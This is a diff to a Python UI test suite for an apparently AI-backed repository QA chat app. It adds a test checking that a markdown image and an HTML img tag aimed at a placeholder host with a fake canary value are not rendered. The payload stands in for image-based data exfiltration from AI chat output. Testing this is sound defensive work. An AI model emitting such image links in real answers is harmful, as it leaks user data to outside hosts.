@@ -235,8 +235,22 @@ class RepositoryUITests(unittest.TestCase):
         with patch("agent.qa_agent.ask_stream", side_effect=response):
             self.app.chat_input[0].set_value("测试问题").run(timeout=60)
         self.assertEqual(len(self.app.exception), 0)
-        self.assertIn("S99：引用编号不存在。", self.app.markdown[-1].value)
+        self.assertTrue(any("S99：引用编号不存在。" in item.value for item in self.app.text))
         self.assertEqual(len(self.app.code), 0)
+
+    def test_untrusted_answer_and_user_input_do_not_render_external_images(self):
+        payload = '![pixel](https://example.invalid/pixel?value=FAKE_CANARY) <img src="https://example.invalid/html">'
+        async def response(*args, on_result=None, **kwargs):
+            on_result(CheckedAnswer(text=payload))
+            yield payload
+        with patch("agent.qa_agent.ask_stream", side_effect=response):
+            self.app.chat_input[0].set_value(payload).run(timeout=60)
+        self.assertEqual(len(self.app.exception), 0)
+        self.assertTrue(any(item.value == payload for item in self.app.text))
+        self.assertFalse(any(payload == item.value for item in self.app.markdown))
+        from tests.test_security_output import Tags
+        rendered = self.app.get("html")[0].proto.body
+        self.assertFalse(any(tag == "img" for tag, attrs in Tags(rendered).tags))
 
     def fixture_overview(self, commit_sha=None):
         source = SourceCitation(repo_url=URL, commit_sha=commit_sha or self.new.commit_sha,
